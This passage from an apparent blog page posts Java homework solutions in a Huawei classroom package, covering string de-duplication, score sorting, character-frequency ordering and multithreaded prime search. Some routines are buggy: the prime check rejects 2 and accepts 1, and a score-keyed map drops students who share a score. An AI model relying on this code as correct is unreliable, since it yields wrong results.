&#123;</span><br><span class="line">			<span class="keyword">char</span> tmp = s.charAt(i);</span><br><span class="line">			<span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; ans.length();j++) &#123;</span><br><span class="line">				<span class="keyword">if</span>(ans.charAt(j) == tmp) &#123;</span><br><span class="line">					flag = <span class="keyword">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(flag) &#123;</span><br><span class="line">				ans += tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q5"><a href="#q5" class="headerlink" title="q5"></a>q5</h4><ul>
<li>StudentUtilB.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q05;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentUtilB</span> </span>&#123;</span><br><span class="line">	StudentUtilB()&#123;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> String[]sort(String content)&#123;</span><br><span class="line">		String[] students = content.split(<span class="string">";"</span>);</span><br><span class="line">		String[] ans = <span class="keyword">new</span> String[students.length];</span><br><span class="line">		HashMap&lt;Integer,String&gt; map = <span class="keyword">new</span> HashMap&lt;Integer,String&gt;();</span><br><span class="line">		<span class="keyword">int</span>[] score = <span class="keyword">new</span> <span class="keyword">int</span>[students.length]; </span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; students.length;i++) &#123;</span><br><span class="line">			String item = students[i];</span><br><span class="line">			String[] data = item.split(<span class="string">","</span>);</span><br><span class="line">			score[i] = (<span class="keyword">int</span>)Integer.valueOf(data[<span class="number">1</span>]);</span><br><span class="line">			map.put(score[i], data[<span class="number">0</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		Arrays.sort(score);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; students.length;i++) &#123;</span><br><span class="line">			ans[students.length-<span class="number">1</span>-i] = (String)map.get(score[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home11"><a href="#Home11" class="headerlink" title="Home11"></a>Home11</h3><ul>
<li><p>CharCount.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharCount</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">	<span class="keyword">int</span> count;</span><br><span class="line">	CharCount(<span class="keyword">char</span> c,<span class="keyword">int</span> count)&#123;</span><br><span class="line">		<span class="keyword">this</span>.c = c;</span><br><span class="line">		<span class="keyword">this</span>.count = count;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>cmp.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmp</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">CharCount</span>&gt;</span>&#123;</span><br><span class="line">	cmp()&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(CharCount a,CharCount b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (a.count &lt; b.count)?<span class="number">1</span>:(a.count &gt; b.count)?-<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>cmpByScoreDesc.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmpByScoreDesc</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">Student</span>&gt; </span>&#123;</span><br><span class="line">	String Desc;</span><br><span class="line">	cmpByScoreDesc(String Desc)&#123;</span><br><span class="line">		<span class="keyword">this</span>.Desc = Desc;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Student a,Student b)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">""</span>+a.score.get(<span class="keyword">this</span>.Desc)+b.score.get(<span class="keyword">this</span>.Desc));</span><br><span class="line">		Double x = a.score.get(<span class="keyword">this</span>.Desc) == <span class="keyword">null</span>?(<span class="number">0.0</span>):a.score.get(<span class="keyword">this</span>.Desc);</span><br><span class="line">		Double y = b.score.get(<span class="keyword">this</span>.Desc) == <span class="keyword">null</span>?(<span class="number">0.0</span>):b.score.get(<span class="keyword">this</span>.Desc);</span><br><span class="line">		<span class="keyword">if</span>(Math.abs(x-y) &lt; <span class="number">0.00001</span> ) </span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(x&gt;y)</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>cmpByTotalScore.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmpByTotalScore</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">Student</span>&gt; </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Student a,Student b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Math.abs(a.total - b.total) &lt; <span class="number">0.00001</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(a.total &gt; b.total) &#123;</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Home11Char.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home11Char</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home11Char</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将一个字符串中字符按出现频率的高到低排序返回，如果两个字符出现的频率一样，则将最先出现的字符排在前面</span></span><br><span class="line"><span class="comment">	 * 例如：orderChar(“abcdefg”)返回 “abcdefg” </span></span><br><span class="line"><span class="comment">	 * orderChar(“abcdefgg”)返回 “gabcdef”</span></span><br><span class="line"><span class="comment">	 * orderChar(“abcdefgge”)返回 “egabcdf”</span></span><br><span class="line"><span class="comment">	 * orderChar(“天津大学软件学院”)返回 “学天津大软件院”</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">orderChar</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">		HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; content.length();i++) &#123;</span><br><span class="line">			set.add(content.charAt(i));</span><br><span class="line">		&#125;</span><br><span class="line">		Iterator it = set.iterator();</span><br><span class="line">		CharCount[]arr = <span class="keyword">new</span> CharCount[set.size()];</span><br><span class="line">		System.out.println(set.size());</span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">char</span> c = (<span class="keyword">char</span>)it.next();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; content.length();j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(content.charAt(j) == c) &#123;</span><br><span class="line">					count++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			arr[i++] = <span class="keyword">new</span> CharCount(c,count);</span><br><span class="line">		&#125; </span><br><span class="line">		Arrays.sort(arr,<span class="keyword">new</span> cmp());</span><br><span class="line">		String ans = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; arr.length;i++) &#123;</span><br><span class="line">			ans += arr[i].c; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Home11Score.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home11Score</span> </span>&#123;</span><br><span class="line">	HashMap&lt;String,Student&gt; nameToStu;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home11Score</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		nameToStu = <span class="keyword">new</span> HashMap&lt;String,Student&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置每个同学的成绩一个字符串中包含了若干学生选修课的成绩</span></span><br><span class="line"><span class="comment">	 * （每个同学选修的课程数量不同，成绩可能出现小数）， </span></span><br><span class="line"><span class="comment">	 * 构成方式如下：学生姓名,科目,成绩;</span></span><br><span class="line"><span class="comment">	 * 学生姓名,科目,成绩....;</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScores</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">		String[] items = content.split(<span class="string">";"</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; items.length;i++) &#123;</span><br><span class="line">			String[] info = items[i].split(<span class="string">","</span>);</span><br><span class="line">			<span class="keyword">if</span>(!nameToStu.containsKey(info[<span class="number">0</span>])) &#123;</span><br><span class="line">				nameToStu.put(info[<span class="number">0</span>], <span class="keyword">new</span> Student(items[i]));</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				nameToStu.get(info[<span class="number">0</span>]).add(items[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Set&lt;String&gt; set = <span class="keyword">this</span>.nameToStu.keySet();</span><br><span class="line">		Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.nameToStu.get(it.next()).calTotal();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 *  返回学生名单，按指定的课程成绩由高到低排序（不会出现并列情况）</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> courseName</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> String[] getStudentdNameByScoreDesc(String courseName)&#123;</span><br><span class="line">		Set&lt;String&gt; set = <span class="keyword">this</span>.nameToStu.keySet();</span><br><span class="line">		Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">		<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 先判断有多少人会被排名(只是为了知道开多大的数组)</span></span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			<span class="keyword">if</span>(nameToStu.get(it.next()).score.get(courseName) != <span class="keyword">null</span>) &#123;</span><br><span class="line">				cnt ++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Student[] stus = <span class="keyword">new</span> Student[cnt];</span><br><span class="line">		it=set.iterator();</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 把这些人加进待排序的数组</span></span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			Student person = <span class="keyword">this</span>.nameToStu.get(it.next());</span><br><span class="line">			<span class="keyword">if</span>(person.score.get(courseName) != <span class="keyword">null</span>) &#123;</span><br><span class="line">				stus[index++] = person;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 排序</span></span><br><span class="line">		Arrays.sort((Student[])(stus),<span class="keyword">new</span> cmpByScoreDesc(courseName));</span><br><span class="line">		String[] ans = <span class="keyword">new</span> String[cnt];</span><br><span class="line">		<span class="comment">// 提取出名字</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; cnt;i++) &#123;</span><br><span class="line">			ans[i] = stus[i].name;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 *  返回学生名单，按指定的课程总成绩由高到低排序（不会出现并列情况）</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> String[] getStudentdNameByTotalScoreDesc()&#123;</span><br><span class="line">		Set&lt;String&gt; set = <span class="keyword">this</span>.nameToStu.keySet();</span><br><span class="line">		Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">		Student[] stus = <span class="keyword">new</span> Student[<span class="keyword">this</span>.nameToStu.size()];</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			stus[index++] = <span class="keyword">this</span>.nameToStu.get(it.next());</span><br><span class="line">		&#125;</span><br><span class="line">		Arrays.sort(stus,<span class="keyword">new</span> cmpByTotalScore());</span><br><span class="line">		String[] ans = <span class="keyword">new</span> String[stus.length];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; ans.length;i++) &#123;</span><br><span class="line">			ans[i] = stus[i].name;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Student.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h11;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	HashMap&lt;String, Double&gt; score;</span><br><span class="line">	Double total;</span><br><span class="line">	Student(String info)&#123;</span><br><span class="line">		total = <span class="number">0.0</span>;</span><br><span class="line">		score = <span class="keyword">new</span> HashMap&lt;String, Double&gt;();</span><br><span class="line">		add(info);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String info)</span> </span>&#123;</span><br><span class="line">		String[] infos = info.split(<span class="string">","</span>);</span><br><span class="line">		<span class="keyword">this</span>.name = infos[<span class="number">0</span>];</span><br><span class="line">		score.put(infos[<span class="number">1</span>], Double.parseDouble(infos[<span class="number">2</span>]));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">calTotal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Set&lt;String&gt; set = score.keySet();</span><br><span class="line">		Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">		<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">			cnt += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">this</span>.total += <span class="keyword">this</span>.score.get(it.next());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home12"><a href="#Home12" class="headerlink" title="Home12"></a>Home12</h3><ul>
<li><p>MyThread.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h12;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	ArrayList&lt;Long&gt;[] result;</span><br><span class="line">	<span class="keyword">long</span> base;</span><br><span class="line">	<span class="keyword">long</span> top;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">long</span> a)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(a == <span class="number">2</span>)	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">long</span> mark = (<span class="keyword">long</span>)Math.sqrt(a)+<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">long</span> i = <span class="number">2</span>;i &lt;= mark;i++) &#123;</span><br><span class="line">				<span class="keyword">if</span>(a % i == <span class="number">0</span>)	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVar</span><span class="params">(ArrayList&lt;Long&gt;[]res, <span class="keyword">int</span> num, <span class="keyword">long</span> base, <span class="keyword">long</span> top)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.num = num;</span><br><span class="line">		<span class="keyword">this</span>.result = res;</span><br><span class="line">		<span class="keyword">this</span>.base = base;</span><br><span class="line">		<span class="keyword">this</span>.top = top;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.result[num] = <span class="keyword">new</span> ArrayList&lt;Long&gt;();</span><br><span class="line">		<span class="keyword">for</span>(Long i = base;i &lt; top;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(isPrime(i)) &#123;</span><br><span class="line">				<span class="keyword">this</span>.result[num].add(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>PrimeUtil.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h12;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimeUtil</span> </span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 使用threadCount个线程计算出 [start,end] 之间所有的质数，并按递增顺序放到list中</span></span><br><span class="line"><span class="comment">	 * 其中 end-start &gt;threadCount</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> start </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> end </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> threadCount  线程数量</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">long</span>[] multiThreadGetPrimeList(<span class="keyword">long</span> 